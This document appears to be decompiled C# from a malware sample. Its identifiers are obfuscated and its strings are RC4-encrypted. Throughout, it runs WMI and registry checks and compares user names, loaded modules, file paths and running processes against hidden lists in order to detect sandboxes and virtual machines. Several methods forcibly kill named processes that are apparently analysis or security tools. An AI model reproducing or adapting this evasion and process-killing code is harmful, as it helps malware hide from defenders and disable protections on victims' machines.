using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ajhfsdlhjasnagfgewfwsg;

[StandardModule]
internal sealed class reityureoiuterioutreoiutioerutoierutoiert
{
	private static object D;

	private static string R;

	private static string FullFile;

	private static string B = RRRRR.RC4("šZèS\u000eQÆ\vú{\u0081\f÷\\Ú\u0016Ê{ÊÔtïÜ\u0001ú_Z»cmk;!gTGö", "Sikan");

	private static object pid = RuntimeHelpers.GetObjectValue(regPID.GetValue(RRRRR.RC4("è{Â{>qæb\u00b4", "Sikan")));

	private static string id = RRRRR.RC4("\u008f?™'|?¡\u0018çvÿjŠ(Ãt–8ËÔ\u001dˆ\u0081", "Sikan");

	private static RegistryKey regPID = Registry.LocalMachine.OpenSubKey(RRRRR.RC4("n\u001f?\u0006æ1EþªsV‚.M>\u001b½øÃ\u001cðÏ/Ó£{>æÓ1!\u00a0\u0016\u00a8:\u008d\\ù&H•v9†", "Sik3"), writable: false);

	private static string[] sExes = new string[6]
	{
		RRRRR.RC4("ÒfÈ}$jáN¢-¢,–t‚$", "Sikan"),
		RRRRR.RC4("ÒfÈ}$jñD¾/µ1Ô?Ÿ9Æ", "Sikan"),
		RRRRR.RC4("Ï`ßz8zóY»u¢&Ý", "Sikan"),
		RRRRR.RC4("Ù\u007fÝ1.j÷", "Sikan"),
		RRRRR.RC4("ËgÄy-MúB¤u¢&Ý", "Sikan"),
		RRRRR.RC4("ËpÞ^%sþRª>µpÝiŸ", "Sikan")
	};

	private static string[] sUsers = new string[3]
	{
		RRRRR.RC4("ÍzÈm%sÿN", "Sikan"),
		RRRRR.RC4("ÍzÈm", "Sikan"),
		RRRRR.RC4("Û|ßm.|æ^£>µ", "Sikan")
	};

	private static string[] sModules = new string[4]
	{
		RRRRR.RC4("ÙyÄ@'}õ\u0005\u00b47«", "Sikan"),
		RRRRR.RC4("Ü`ß@<sæH\u00b8u£2Ô", "Sikan"),
		RRRRR.RC4("ÈzÙp9wñ\u0005\u00b47«", "Sikan"),
		RRRRR.RC4("ëkÄz\u000f~þ\u0005\u00b47«", "Sikan")
	};

	private static Process[] p = Process.GetProcesses();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

	public static void T()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object @object = Interaction.GetObject(RRRRR.RC4("Ï`Ãr,\u007fæXê", "Sikan"), (string)null);
					object[] array = new object[1] { B };
					bool[] array2 = new bool[1] { true };
					object obj = NewLateBinding.LateGet(@object, (Type)null, "ExecQuery", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						B = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					D = RuntimeHelpers.GetObjectValue(obj);
					IEnumerator enumerator = ((IEnumerable)D).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						R = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "Description", new object[0], (string[])null, (Type[])null, (bool[])null));
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					break;
				}
				case 217:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_0113;
					}
					break;
				}
			}
			catch (object obj2) when (obj2 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 217;
				continue;
			}
			break;
			IL_0113:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static bool dsfkjhsdlkfjioxcvuoisdufoiuewrxc()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					T();
					string r = R;
					flag = ((Operators.CompareString(r, RRRRR.RC4("îD\u008d^/vû_¹4©-\u02dcBÉa÷g\u0090‰\u0018‹šS«", "Sikan"), false) == 0) ? true : false);
					break;
				}
				case 53:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_006b;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 53;
				continue;
			}
			break;
			IL_006b:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool dsfkjhsdlkfjioxcvuoisd324234ufoiuewrxc()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					T();
					string r = R;
					flag = ((Operators.CompareString(r, RRRRR.RC4("î`ßk>sþi¿#ç\u0019ÊpŠ)ÊvŠÆjÝÔ\u0015ëUk", "Sikan"), false) == 0) ? true : false);
					break;
				}
				case 53:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_006b;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 53;
				continue;
			}
			break;
			IL_006b:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool dsfkjhsdlkfvuoisd324234ufoiuewrxc()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					T();
					string r = R;
					flag = ((Operators.CompareString(r, RRRRR.RC4("îDÚ~9w²x†\u001c†~ñX", "Sikan"), false) == 0) ? true : false);
					break;
				}
				case 53:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_006b;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 53;
				continue;
			}
			break;
			IL_006b:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object dsfkjhsdlkfvu44oisd324234ufoiuewrxc()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ÝnØv", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object dsfkjhsd324234lkfvu44oisd324234ufoiuewrxc()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("×eÁf/põ", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object dsfhsd324234lkfvu44oisd324234ufoiuewrxc()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ù_èQ\f[Ün", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object asdjsagdkjxzcyiusayeiuwqyeiuwqyeiuwqyeiuwqeysAnalyzer()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ËpÞk.\u007fóE±7¾$Ýc", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object asdjsagdkjxzcyiusayeiuwqyeiuwqyeiuwqyeiuwqeunbelt()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ëKìR8dñ", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object dsfhsd3234lkfvu44oisd324234ufoiuewrxc()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("úmÙj;vó_µ(¢,Îx™$", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object dsfhsd3234lkfvu4445545oisd324234ufoiuewrxc()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ÕkÌr", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static bool dsfhsd3234lkfvu444554d324234ufoiuewrxc()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = Process.GetProcessesByName(RRRRR.RC4("ëkÄz\u0018dñ", "Sikan")).Length >= 1;
					break;
				case 42:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_0060;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 42;
				continue;
			}
			break;
			IL_0060:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool dsfhsd3234lvu444554d324234ufoiuewrxc()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string startupPath = Application.get_StartupPath();
					string text = startupPath + RRRRR.RC4("äzÌr;~÷\u0005µ#¢", "Sikan");
					flag = ((Operators.CompareString(Application.get_ExecutablePath(), text, false) == 0) ? true : false);
					break;
				}
				case 60:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_0074;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 60;
				continue;
			}
			break;
			IL_0074:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool dsfhsd345345234lvu444554d324234ufoiuewrxc()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = (Operators.ConditionalCompareObjectEqual(pid, (object)id, false) ? true : false);
					break;
				case 35:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_0059;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 35;
				continue;
			}
			break;
			IL_0059:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object sadiasudoiuszc98z7xc987283947324()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ë.S\u02dcÒ‰™C", "Sikan3"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object sadiasudoiu34szc98z7xc987283947324()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ÿ2V™È‹", "Sikan3"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object sadiasudoiu34sz3c98z7xc987283947324()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("þ7D„ÔŸƒ", "Sikan3"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object sadias33udoiu34sz3c98z7xc987283947324()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ÚmÌx.|æ", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object sadias33udoiu3334sz3c98z7xc987283947324()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ï`Ãz", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static bool sadias333udoiu3334sz3c98z7xc987283947324()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = Process.GetProcessesByName(RRRRR.RC4("Ù\u007fÝ", "Sikan")).Length >= 1;
					break;
				case 42:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_0060;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 42;
				continue;
			}
			break;
			IL_0060:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object sadias333udo334sz3c98z7xc987283947324()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ÓlÔl(`óF²7¢,", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object sadias33443udo334sz3c98z7xc987283947324()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("Ð`Ç~(yæC¹(", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static object sadias3344223udo334sz3c98z7xc987283947324()
	{
		checked
		{
			int num = p.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(p[i].ProcessName);
				if (Operators.CompareString(text, RRRRR.RC4("ÒfÈ}$jáN¢-¢,", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
				else if (Operators.CompareString(text, RRRRR.RC4("ÒfÈ}$jñD¾/µ1Ô", "Sikan"), false) == 0)
				{
					p[i].Kill();
				}
			}
			object result = default(object);
			return result;
		}
	}

	public static bool asdjsagdkjxzcyiusayeiuwqyeiuwqyeiuwqyeiuwqeandbox()
	{
		bool result = default(bool);
		try
		{
			if (UserCheck())
			{
				result = true;
				return result;
			}
			if (ProcessCheck())
			{
				result = true;
				return result;
			}
			if (Application.get_ExecutablePath().Contains(RRRRR.RC4("Þ`ÁzewêN", "Sikan")))
			{
				result = true;
				return result;
			}
			if (Application.get_ExecutablePath().Contains(RRRRR.RC4("ëhÀo'w¼N\u00a8>", "Sikan")) | (Operators.CompareString(Interaction.Environ(RRRRR.RC4("ÍzÈm%sÿN", "Sikan")), RRRRR.RC4("ÙgÉf", "Sikan"), false) == 0) | (Operators.CompareString(Interaction.Environ(RRRRR.RC4("ÍzÈm%sÿN", "Sikan")), RRRRR.RC4("ùgÉf", "Sikan"), false) == 0))
			{
				result = true;
				return result;
			}
			if (ModuleCheck())
			{
				result = true;
				return result;
			}
			if ((Operators.CompareString(Application.get_StartupPath(), "C:\\", false) == 0) | (Operators.CompareString(Application.get_StartupPath(), "D:\\", false) == 0) | (Operators.CompareString(Application.get_StartupPath(), "F:\\", false) == 0) | ((Operators.CompareString(Application.get_StartupPath(), "X:\\", false) == 0) & (Operators.CompareString(Interaction.Environ(RRRRR.RC4("ÍzÈm%sÿN", "Sikan")), RRRRR.RC4("PìØûâ)±ì", "Sikan32"), false) == 0)))
			{
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static bool ProcessCheck()
	{
		bool result = default(bool);
		try
		{
			Process[] array = p;
			foreach (Process process in array)
			{
				string text = process.ProcessName + ".exe";
				if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual((object)text, sExes.GetValue(0), false), Operators.CompareObjectEqual((object)text, sExes.GetValue(1), false)), Operators.CompareObjectEqual((object)text, sExes.GetValue(2), false)), Operators.CompareObjectEqual((object)text, sExes.GetValue(3), false)), Operators.CompareObjectEqual((object)text, sExes.GetValue(4), false)), Operators.CompareObjectEqual((object)text, sExes.GetValue(5), false))))
				{
					result = true;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static bool UserCheck()
	{
		checked
		{
			bool result = default(bool);
			try
			{
				int num = sUsers.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (Operators.ConditionalCompareObjectEqual((object)Interaction.Environ(RRRRR.RC4("vüÕäå,\u00a8à", "Sikan32")), sUsers.GetValue(i), false))
					{
						result = true;
						return result;
					}
				}
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private static bool ModuleCheck()
	{
		bool result = default(bool);
		try
		{
			int num = checked(sModules.Length - 1);
			for (int i = 0; i <= num; i = checked(i + 1))
			{
				string lpModuleName = Conversions.ToString(sModules.GetValue(i));
				if ((ulong)GetModuleHandleA(ref lpModuleName) > 0uL)
				{
					result = true;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
